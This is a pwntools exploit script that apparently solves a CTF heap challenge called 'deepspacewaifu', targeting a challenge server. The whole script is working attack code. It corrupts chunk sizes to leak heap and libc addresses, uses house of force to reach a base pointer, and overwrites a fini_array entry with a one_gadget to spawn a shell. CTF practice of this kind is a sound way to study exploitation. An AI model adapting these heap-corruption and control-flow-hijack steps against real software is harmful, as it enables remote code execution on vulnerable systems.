from pwn import *

#init 

e = ELF('./deepspacewaifu')
libc = ELF('./libc-2.27.so')

p = process(e.path)
p = remote('deepspacewaifu.lit-ctf-2021-3-codelab.kctf.cloud', 1337)

#funcs

def add(x):
    p.sendlineafter('?', '1')
    p.sendlineafter('?', str(x))

def fre(x):
    p.sendlineafter('?', '2')
    p.sendlineafter('?', str(x))

def chg(x, s, t = True):
    if t:
        p.sendlineafter('?', '3')
    p.sendlineafter('?', str(x))
    p.sendlineafter('!', s)

def rd(x):
    p.sendlineafter('?', '4')
    p.sendlineafter('?', str(x))
    p.recvuntil('!\n')
    return p.recvline(keepends = False)

#vars

fini_array = e.sym['__do_global_dtors_aux_fini_array_entry']
main_arena_off = 0x3ebca0
base_ptr_off = 0x61a170
one_gadget = 0x4f3c2 

log.info('Fini array adr: ' + hex(fini_array))
log.info('Main arena libc off: ' + hex(main_arena_off))
log.info('Base ptr libc off: ' + hex(base_ptr_off))
log.info('One gadget libc off: ' + hex(one_gadget))

#exploit

#overwrite byte on large chnk size to extend it and create temporary second large chunk for securities

add(0x48)
add(0x4f8)
add(0x18)
add(0x418)

chg(0, b'a' * 0x37)
chg(3, p64(0x21) * 0x10)

#free both large chunks so top chnk size can be overwritten by libc pointer after allocating from main arena

fre(1)
fre(3)

add(0x508)

#this also gives heap and libc leak

top_chnk = u64(rd(4)[:8]) + 0x520
libc_off = u64(rd(2)[:8]) - main_arena_off

log.info('Top chnk adr: ' + hex(top_chnk))
log.info('Libc off adr: ' + hex(libc_off))

#can now write up to base ptr using house of force since top chnk overwritten

add(libc_off + base_ptr_off - top_chnk - 4 * 0x8)

#add chunk on base ptr and use free to change it to pointer to heap

add(0x48)

fre(0)
fre(3)

#call exit which will call address at fini offset from base ptr we overwrote

p.sendlineafter('?', '5')
p.sendlineafter('(Y/n)', 'y')

chg(1, b'a' * (fini_array - 0x50 - 0x500 - 0x20 - 0x10) + p64(libc_off + one_gadget), False)

#pray for flag

p.interactive()
